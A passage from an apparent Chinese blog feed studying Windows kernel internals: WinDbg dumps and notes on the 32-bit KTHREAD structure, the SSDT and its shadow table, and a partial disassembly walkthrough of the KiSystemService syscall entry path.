KernelStackReference : Uint4B</span><br></pre></td></tr></table></figure><p>其中 <code>KTHREAD</code> 结构如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KTHREAD</span><br><span class="line">nt!_KTHREAD</span><br><span class="line">   <span class="number">+0x000</span> Header           : _DISPATCHER_HEADER</span><br><span class="line">   <span class="number">+0x010</span> CycleTime        : Uint8B</span><br><span class="line">   <span class="number">+0x018</span> HighCycleTime    : Uint4B</span><br><span class="line">   <span class="number">+0x020</span> QuantumTarget    : Uint8B</span><br><span class="line">   <span class="number">+0x028</span> InitialStack     : Ptr32 Void</span><br><span class="line">   <span class="number">+0x02c</span> StackLimit       : Ptr32 Void</span><br><span class="line">   <span class="number">+0x030</span> KernelStack      : Ptr32 Void</span><br><span class="line">   <span class="number">+0x034</span> ThreadLock       : Uint4B</span><br><span class="line">   <span class="number">+0x038</span> WaitRegister     : _KWAIT_STATUS_REGISTER</span><br><span class="line">   <span class="number">+0x039</span> Running          : UChar</span><br><span class="line">   <span class="number">+0x03a</span> Alerted          : [<span class="number">2</span>] UChar</span><br><span class="line">   <span class="number">+0x03c</span> KernelStackResident : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x03c</span> ReadyTransition  : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x03c</span> ProcessReadyQueue : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x03c</span> WaitNext         : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x03c</span> SystemAffinityActive : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x03c</span> Alertable        : Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x03c</span> GdiFlushActive   : Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x03c</span> UserStackWalkActive : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x03c</span> ApcInterruptRequest : Pos <span class="number">8</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x03c</span> ForceDeferSchedule : Pos <span class="number">9</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x03c</span> QuantumEndMigrate : Pos <span class="number">10</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x03c</span> UmsDirectedSwitchEnable : Pos <span class="number">11</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x03c</span> TimerActive      : Pos <span class="number">12</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x03c</span> SystemThread     : Pos <span class="number">13</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x03c</span> Reserved         : Pos <span class="number">14</span>, <span class="number">18</span> Bits</span><br><span class="line">   <span class="number">+0x03c</span> MiscFlags        : Int4B</span><br><span class="line">   <span class="number">+0x040</span> ApcState         : _KAPC_STATE</span><br><span class="line">   <span class="number">+0x040</span> ApcStateFill     : [<span class="number">23</span>] UChar</span><br><span class="line">   <span class="number">+0x057</span> Priority         : Char</span><br><span class="line">   <span class="number">+0x058</span> NextProcessor    : Uint4B</span><br><span class="line">   <span class="number">+0x05c</span> DeferredProcessor : Uint4B</span><br><span class="line">   <span class="number">+0x060</span> ApcQueueLock     : Uint4B</span><br><span class="line">   <span class="number">+0x064</span> ContextSwitches  : Uint4B</span><br><span class="line">   <span class="number">+0x068</span> State            : UChar</span><br><span class="line">   <span class="number">+0x069</span> NpxState         : Char</span><br><span class="line">   <span class="number">+0x06a</span> WaitIrql         : UChar</span><br><span class="line">   <span class="number">+0x06b</span> WaitMode         : Char</span><br><span class="line">   <span class="number">+0x06c</span> WaitStatus       : Int4B</span><br><span class="line">   <span class="number">+0x070</span> WaitBlockList    : Ptr32 _KWAIT_BLOCK</span><br><span class="line">   <span class="number">+0x074</span> WaitListEntry    : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x074</span> SwapListEntry    : _SINGLE_LIST_ENTRY</span><br><span class="line">   <span class="number">+0x07c</span> Queue            : Ptr32 _KQUEUE</span><br><span class="line">   <span class="number">+0x080</span> WaitTime         : Uint4B</span><br><span class="line">   <span class="number">+0x084</span> KernelApcDisable : Int2B</span><br><span class="line">   <span class="number">+0x086</span> SpecialApcDisable : Int2B</span><br><span class="line">   <span class="number">+0x084</span> CombinedApcDisable : Uint4B</span><br><span class="line">   <span class="number">+0x088</span> Teb              : Ptr32 Void</span><br><span class="line">   <span class="number">+0x090</span> Timer            : _KTIMER</span><br><span class="line">   <span class="number">+0x0b8</span> AutoAlignment    : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x0b8</span> DisableBoost     : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x0b8</span> EtwStackTraceApc1Inserted : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x0b8</span> EtwStackTraceApc2Inserted : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x0b8</span> CalloutActive    : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x0b8</span> ApcQueueable     : Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x0b8</span> EnableStackSwap  : Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x0b8</span> GuiThread        : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x0b8</span> UmsPerformingSyscall : Pos <span class="number">8</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x0b8</span> VdmSafe          : Pos <span class="number">9</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x0b8</span> UmsDispatched    : Pos <span class="number">10</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x0b8</span> ReservedFlags    : Pos <span class="number">11</span>, <span class="number">21</span> Bits</span><br><span class="line">   <span class="number">+0x0b8</span> ThreadFlags      : Int4B</span><br><span class="line">   <span class="number">+0x0bc</span> ServiceTable     : Ptr32 Void</span><br><span class="line">   <span class="number">+0x0c0</span> WaitBlock        : [<span class="number">4</span>] _KWAIT_BLOCK</span><br><span class="line">   <span class="number">+0x120</span> QueueListEntry   : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x128</span> TrapFrame        : Ptr32 _KTRAP_FRAME</span><br><span class="line">   <span class="number">+0x12c</span> FirstArgument    : Ptr32 Void</span><br><span class="line">   <span class="number">+0x130</span> CallbackStack    : Ptr32 Void</span><br><span class="line">   <span class="number">+0x130</span> CallbackDepth    : Uint4B</span><br><span class="line">   <span class="number">+0x134</span> ApcStateIndex    : UChar</span><br><span class="line">   <span class="number">+0x135</span> BasePriority     : Char</span><br><span class="line">   <span class="number">+0x136</span> PriorityDecrement : Char</span><br><span class="line">   <span class="number">+0x136</span> ForegroundBoost  : Pos <span class="number">0</span>, <span class="number">4</span> Bits</span><br><span class="line">   <span class="number">+0x136</span> UnusualBoost     : Pos <span class="number">4</span>, <span class="number">4</span> Bits</span><br><span class="line">   <span class="number">+0x137</span> Preempted        : UChar</span><br><span class="line">   <span class="number">+0x138</span> AdjustReason     : UChar</span><br><span class="line">   <span class="number">+0x139</span> AdjustIncrement  : Char</span><br><span class="line">   <span class="number">+0x13a</span> PreviousMode     : Char</span><br><span class="line">   <span class="number">+0x13b</span> Saturation       : Char</span><br><span class="line">   <span class="number">+0x13c</span> SystemCallNumber : Uint4B</span><br><span class="line">   <span class="number">+0x140</span> FreezeCount      : Uint4B</span><br><span class="line">   <span class="number">+0x144</span> UserAffinity     : _GROUP_AFFINITY</span><br><span class="line">   <span class="number">+0x150</span> Process          : Ptr32 _KPROCESS</span><br><span class="line">   <span class="number">+0x154</span> Affinity         : _GROUP_AFFINITY</span><br><span class="line">   <span class="number">+0x160</span> IdealProcessor   : Uint4B</span><br><span class="line">   <span class="number">+0x164</span> UserIdealProcessor : Uint4B</span><br><span class="line">   <span class="number">+0x168</span> ApcStatePointer  : [<span class="number">2</span>] Ptr32 _KAPC_STATE</span><br><span class="line">   <span class="number">+0x170</span> SavedApcState    : _KAPC_STATE</span><br><span class="line">   <span class="number">+0x170</span> SavedApcStateFill : [<span class="number">23</span>] UChar</span><br><span class="line">   <span class="number">+0x187</span> WaitReason       : UChar</span><br><span class="line">   <span class="number">+0x188</span> SuspendCount     : Char</span><br><span class="line">   <span class="number">+0x189</span> Spare1           : Char</span><br><span class="line">   <span class="number">+0x18a</span> OtherPlatformFill : UChar</span><br><span class="line">   <span class="number">+0x18c</span> Win32Thread      : Ptr32 Void</span><br><span class="line">   <span class="number">+0x190</span> StackBase        : Ptr32 Void</span><br><span class="line">   <span class="number">+0x194</span> SuspendApc       : _KAPC</span><br><span class="line">   <span class="number">+0x194</span> SuspendApcFill0  : [<span class="number">1</span>] UChar</span><br><span class="line">   <span class="number">+0x195</span> ResourceIndex    : UChar</span><br><span class="line">   <span class="number">+0x194</span> SuspendApcFill1  : [<span class="number">3</span>] UChar</span><br><span class="line">   <span class="number">+0x197</span> QuantumReset     : UChar</span><br><span class="line">   <span class="number">+0x194</span> SuspendApcFill2  : [<span class="number">4</span>] UChar</span><br><span class="line">   <span class="number">+0x198</span> KernelTime       : Uint4B</span><br><span class="line">   <span class="number">+0x194</span> SuspendApcFill3  : [<span class="number">36</span>] UChar</span><br><span class="line">   <span class="number">+0x1b8</span> WaitPrcb         : Ptr32 _KPRCB</span><br><span class="line">   <span class="number">+0x194</span> SuspendApcFill4  : [<span class="number">40</span>] UChar</span><br><span class="line">   <span class="number">+0x1bc</span> LegoData         : Ptr32 Void</span><br><span class="line">   <span class="number">+0x194</span> SuspendApcFill5  : [<span class="number">47</span>] UChar</span><br><span class="line">   <span class="number">+0x1c3</span> LargeStack       : UChar</span><br><span class="line">   <span class="number">+0x1c4</span> UserTime         : Uint4B</span><br><span class="line">   <span class="number">+0x1c8</span> SuspendSemaphore : _KSEMAPHORE</span><br><span class="line">   <span class="number">+0x1c8</span> SuspendSemaphorefill : [<span class="number">20</span>] UChar</span><br><span class="line">   <span class="number">+0x1dc</span> SListFaultCount  : Uint4B</span><br><span class="line">   <span class="number">+0x1e0</span> ThreadListEntry  : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x1e8</span> MutantListHead   : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x1f0</span> SListFaultAddress : Ptr32 Void</span><br><span class="line">   <span class="number">+0x1f4</span> ThreadCounters   : Ptr32 _KTHREAD_COUNTERS</span><br><span class="line">   <span class="number">+0x1f8</span> XStateSave       : Ptr32 _XSTATE_SAVE</span><br></pre></td></tr></table></figure><h3 id="成员信息-1"><a href="#成员信息-1" class="headerlink" title="成员信息"></a>成员信息</h3><ul><li>Header：同 <code>EPROCESS</code> 对应的成员。</li><li>InitialStack &#x2F; StackLimit &#x2F; KernelStack：这三个成员十分重要，与线程切换相关。<code>KernelStack</code>为当前切换线程的<code>esp</code>，它们的细节将会在后面的随笔介绍。</li><li>Teb：英文全称为<code>Thread Environment Block</code>，意为线程环境块，大小4KB，位于用户地址空间。在3环时，<code>fs</code>寄存器中存储该结构。</li><li>DebugActive：如果值为-1，则不能使用调试寄存器<code>Dr0</code> - <code>Dr7</code>。</li><li>ApcState &#x2F; ApcQueueLock &#x2F; ApcStatePointer &#x2F; SavedApcState：<code>APC</code>相关。</li><li>State：指示线程状态：<code>waiting</code>&#x2F;<code>ready</code>&#x2F;<code>running</code>。</li><li>BasePriority：其初始值是所属进程的<code>BasePriority</code>值，以后可以通过<code>KeSetBasePriorityThread</code>函数重新设定。</li><li>WaitBlock：里面存储了等待哪个对象，比如调用<code>WaitForSingleObject</code>。</li><li>ServiceTable：指向系统服务表基址。</li><li>TrapFrame：存储着进0环时保存环境。</li><li>PreviousMode：先前模式，指示程序是0环调用还是3环调用的。</li><li>ThreadListEntry：一个进程所有的线程，都挂在一个双向链表中，一共有两个这样的链表，<code>KTHREAD</code>一个，<code>ETHREAD</code>外面一个，示意图如下：</li></ul><img src="/2025/01/24/WindowsProcess1/2.png" class=""><ul><li>Cid：存储着进程ID和线程ID。</li><li>ThreadsProcess：指向自己所属进程。</li></ul><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15595114.html">https://www.cnblogs.com/wingsummer/p/15595114.html</a></li></ul>]]></content>
    
    
    <summary type="html">来学习一下进程与线程的结构</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="进程与线程" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>windows系统调用学习——系统描述符表</title>
    <link href="https://xia0ji233.github.io/2025/01/24/WindowsSyscall4/"/>
    <id>https://xia0ji233.github.io/2025/01/24/WindowsSyscall4/</id>
    <published>2025-01-24T02:00:00.000Z</published>
    <updated>2025-01-24T02:49:32.572Z</updated>
    
    <content type="html"><![CDATA[<p>来学习一下系统描述符表这个结构</p><span id="more"></span><h2 id="SSDT"><a href="#SSDT" class="headerlink" title="SSDT"></a>SSDT</h2><p><code>SSDT</code>的全称是<code>System Services Descriptor Table</code>，意为系统服务描述符表。我们可以通过<code>ETHREAD</code>结构体加偏移的方式进行访问。在内核文件中，有一个变量是导出的：<code>KeServiceDescriptorTable</code>。通过它我们可以访问<code>SSDT</code>。</p><p>可以看看在内核中看看 SSDT 是什么样的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd KeServiceDescriptorTable</span><br><span class="line">83d84a80  83c7f940 00000000 00000192 83c7ff8c</span><br><span class="line">83d84a90  00000000 00000000 00000000 00000000</span><br><span class="line">83d84aa0  00000000 023fd0c0 000000bb 00000011</span><br><span class="line">83d84ab0  5385d2ba d717548f 00000100 00000000</span><br><span class="line">83d84ac0  83c7f940 00000000 00000192 83c7ff8c</span><br><span class="line">83d84ad0  99e6a000 00000000 00000339 99e6b02c</span><br><span class="line">83d84ae0  00000000 00000340 00000340 00000000</span><br><span class="line">83d84af0  00000007 00000000 8691c9c8 8691c900</span><br></pre></td></tr></table></figure><p>再来看看结构体</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_ServiceDescriptorTable</span> &#123;</span><br><span class="line">    PVOID ServiceTableBase;</span><br><span class="line">    PVOID ServiceCounterTable;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> NumberOfServices;</span><br><span class="line">    PVOID ParamTableBase;</span><br><span class="line">&#125;*PServiceDescriptorTable;</span><br></pre></td></tr></table></figure><p>对应起来我们不难得到，当前系统的 SSDT 有 0x192 个函数，基址表在 <code>83c7f940</code>，参数个数表在 <code>83c7ff8c</code>，计数器表设为了 0 表示对此不感兴趣。</p><p>根据本篇章的第一节也可以看出来，我们调用的 <code>ReadProcessMemory</code> 系统调用号为 0x115，对应寻找一下函数基址和参数个数。</p><img src="/2025/01/24/WindowsSyscall4/1.png" class=""><p>可以找到 <code>NtReadVirtualMemory</code> 函数地址和 0x14 参数字节数，刚好 5 个 4 字节。</p><p>该符号导出了，如果要在驱动程序中直接使用，则需要申明。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable;</span><br></pre></td></tr></table></figure><h2 id="SSDTShadow"><a href="#SSDTShadow" class="headerlink" title="SSDTShadow"></a>SSDTShadow</h2><p><code>SSDTShadow</code>和<code>SSDT</code>不一样的是它并没有从内核文件导出。不过我们还是可以从<code>WinDbg</code>找到它：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd KeServiceDescriptorTableShadow</span><br><span class="line">83d84ac0  83c7f940 00000000 00000192 83c7ff8c</span><br><span class="line">83d84ad0  99e6a000 00000000 00000339 99e6b02c</span><br><span class="line">83d84ae0  00000000 00000340 00000340 00000000</span><br><span class="line">83d84af0  00000007 00000000 8691c9c8 8691c900</span><br><span class="line">83d84b00  8690c900 8691c838 8690c9c8 00000000</span><br><span class="line">83d84b10  8690c838 00000000 00000000 83c79039</span><br><span class="line">83d84b20  83c8c485 83cb29a5 00000003 86850000</span><br><span class="line">83d84b30  86851000 00000120 00000000 ffffffff</span><br></pre></td></tr></table></figure><p>它的结构和<code>SSDT</code>是一模一样的，只不过它多了一张表，就是少的那个与<code>GUI</code>相关的服务表。</p><h2 id="SSDThook"><a href="#SSDThook" class="headerlink" title="SSDThook"></a>SSDThook</h2><p>无论是自己伪造一张表还是直接修改表，都可以达到劫持 API 的目的，然而这些已经是过去式了，现在微软已经不允许 SSDT Hook 了。由于笔者本地没有 Windows7 32位的驱动，所以这个实验也不太好做了。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15563970.html">https://www.cnblogs.com/wingsummer/p/15563970.html</a></li></ul>]]></content>
    
    
    <summary type="html">来学习一下系统描述符表这个结构</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="系统调用" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>windows系统调用学习——调用细节与系统服务表</title>
    <link href="https://xia0ji233.github.io/2025/01/22/WindowsSyscall3/"/>
    <id>https://xia0ji233.github.io/2025/01/22/WindowsSyscall3/</id>
    <published>2025-01-22T08:00:00.000Z</published>
    <updated>2025-01-22T08:43:18.755Z</updated>
    
    <content type="html"><![CDATA[<p>来深入挖掘一下Windows系统调用的过程</p><span id="more"></span><h2 id="KiSystemService分析"><a href="#KiSystemService分析" class="headerlink" title="KiSystemService分析"></a>KiSystemService分析</h2><p>这个函数是通过中断门进的，中断门本身保存了 <code>CS</code> 和 <code>EIP</code>，跨段提权后通过 TSS 拿到零环的 <code>SS</code> 和 <code>ESP</code>。此时为了维护三环的上下文状态，则会将各种寄存器保存到堆栈，也就是 <code>Trap_Frame</code> 结构体，中断门提权之后本身就会按顺序压入 <code>SS</code>，<code>ESP</code>，<code>ELFAGS</code>，<code>CS</code>，<code>EIP</code>。此时比较一下上一篇文章中提到的 <code>Trap_Frame</code> 结构图，大概就能知道为什么这么排布了，随后系统调用的入口则会按顺序保存这些信息。</p><img src="/2025/01/22/WindowsSyscall3/1.png" class=""><p>开头的一堆 <code>push</code> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:00434FEA 6A 00                                   push    0</span><br><span class="line">.text:00434FEC 55                                      push    ebp</span><br><span class="line">.text:00434FED 53                                      push    ebx</span><br><span class="line">.text:00434FEE 56                                      push    esi</span><br><span class="line">.text:00434FEF 57                                      push    edi</span><br><span class="line">.text:00434FF0 0F A0                                   push    fs</span><br></pre></td></tr></table></figure><p>正对应了结构体的 <code>ErrorCode</code>，<code>Ebp</code>，<code>Ebx</code>，<code>Esi</code>，<code>Edi</code>，<code>SegFs</code>。</p><p>随后对应也将 FS 切换到了 R0 的值 0x30，再把对应的 <code>ExceptionList</code> 和 <code>PreviousPreviousMode</code> 压入，也就是这里的 <code>fs:[0</code>] 和 <code>[fs:[0x124]+0x13A]</code>。</p><p><code>fs</code> 前面说过了，是在 R3 指向 TEB 的段选择子，它的基址就在 TEB 上，在 R0 会指向 <code>KPCR</code> 结构，这个结构上篇文章分析过了，那么来看看<code>fs:[0]</code> 和 <code>[[KPCR+0x124]+0x13A]</code> 的值是否如我们所想，根据上篇文章的分析，可以得知 <code>fs:[0]</code> 就是 <code>ExceptionList</code> 字段，而 <code>fs:[0x124]</code> 指向 <code>CurrentThread</code> 成员，而 <code>KTHREAD+0x13A</code> 正是当前线程的 <code>PreviousMode</code> 字段，完美对应上。压入之后，还会给当前 <code>ExceptionList</code> 赋值为 -1。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:00435022 83 EC 48                                sub     esp, 48h</span><br><span class="line">.text:00435025 8B 5C 24 6C                             mov     ebx, dword ptr [esp+68h+arg_0]</span><br><span class="line">.text:00435029 83 E3 01                                and     ebx, 1</span><br><span class="line">.text:0043502C 88 9E 3A 01 00 00                       mov     [esi+13Ah], bl</span><br><span class="line">.text:00435032 8B EC                                   mov     ebp, esp</span><br><span class="line">.text:00435034 8B 9E 28 01 00 00                       mov     ebx, [esi+128h]</span><br><span class="line">.text:0043503A 89 5D 3C                                mov     [ebp+3Ch], ebx</span><br><span class="line">.text:0043503D F6 45 6C 01                             test    byte ptr [ebp+6Ch], 1</span><br><span class="line">.text:00435041 75 1E                                   jnz     short loc_435061</span><br><span class="line">.text:00435043 0F AE E8                                lfence</span><br><span class="line">.text:00435046 E9 A8 01 00 00                          jmp     loc_4351F3</span><br></pre></td></tr></table></figure><p>保存完成这些字段之后， <code>esp</code> 额外被减了 <code>0x48</code>，刚好是 Trap_Frame 剩余字段的大小（不包括虚拟8086模式的字段）。将 Ebp 提上来，随后拿到 <code>CurrentThread+0x128</code>，通过查找可以得知是 <code>Trap_Frame</code> 指针，保存到了 <code>ebp+0x3C</code> 的位置上，此时 <code>ESP</code> 指向了栈中保存的 <code>Trap_Frame</code> 结构，也就是将 <code>CurrentThread</code>  的 <code>Trap_Frame</code> 存到了栈中的 <code>Trap_Frame+0x3C</code>，<code>Edx</code> 字段所处的位置。</p><p>随后拿到栈中 <code>Trap_Frame</code> 中的 <code>SegCs</code> 字段（+0x6C），<code>&amp;1</code> 后判断是否为 0，因为 Windows 没有实现 R1 和 R2，所以这里可以简单认为如果发出中断的线程不为内核线程则跳转。通常情况下，发出系统调用的线程都是 R3 的，所以着重分析跳转的分支。（To Be Continued…）</p><h2 id="SystemServiceTable"><a href="#SystemServiceTable" class="headerlink" title="SystemServiceTable"></a>SystemServiceTable</h2><p>之前我们讲到进0环后，3环的各种寄存器的值都会保留到<code>_Trap_Frame</code>结构体中，接下来我将会讲解：如何根据系统服务号（eax中存储）找到要执行的内核函数？调用时参数是存储到3环的堆栈，如何传递给内核函数？首先我们得知道一个结构体，用来描述内核函数信息的表：<code>SystemServiceTable</code>，即系统服务表</p><img src="/2025/01/22/WindowsSyscall3/2.png" class=""><p>可以看出这个表由4部分组成，<code>ServiceTable</code>指向的是函数地址数组，每个成员四个字节；<code>Count</code>表示调用次数，没啥意义；<code>ServiceLimit</code>表示这张表有几个函数；<code>ArgumentTable</code>指向对应函数有几个字节参数，每个成员一个字节。</p><p>从图中可以看出，<code>Windows</code>提供了两张表：上面的表是用来处理一般内核函数的，下面这张表是用来处理与<code>GUI</code>相关的内核函数。</p><p>这个表会存在 <code>ETHREAD+0xbc</code> （ETHREAD的头部就是KTHREAD）偏移的位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KTHREAD</span><br><span class="line">ntdll!_KTHREAD</span><br><span class="line">   //...</span><br><span class="line">   +0x0b8 ThreadFlags      : Int4B</span><br><span class="line">   +0x0bc ServiceTable     : Ptr32 Void</span><br><span class="line">   //...</span><br></pre></td></tr></table></figure><p>拿到了系统调用号如何去寻找对应的系统函数呢，看如下示意图</p><img src="/2025/01/22/WindowsSyscall3/3.png" class=""><h2 id="APIService分析"><a href="#APIService分析" class="headerlink" title="APIService分析"></a>APIService分析</h2><p>从系统调用的代码往后分析，可以找到系统调用入口对调用号的处理</p><img src="/2025/01/22/WindowsSyscall3/4.png" class=""><p>顺着看一遍</p><p>其中 <code>ESI+0xBC</code> 就对应了线程的 <code>ServiceTable</code> 成员，加上 <code>edi</code> 刚刚好，因为表的大小刚好就是 0x10，所以如果是这里直接加上去，<code>edi</code> 的结果只能是 <code>0</code> 或者 <code>0x10</code>，这样加上去 <code>edi</code> 最终都指向了正确的表。</p><p>然后拿到 <code>eax</code> 与 <code>ServiceLimit</code> 相比较，如果 <code>eax&gt;=ServiceLimit</code> 则直接报错，很好理解。</p><p>随后 <code>(eax&gt;&gt;8 &amp; 0x10)==0x10</code> 其实就是判断第 12 位是否为1，如果为 1 则走 <code>loc_4354F8</code> 分支调用 <code>win32k.sys</code> 的函数，我们直接往下分析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 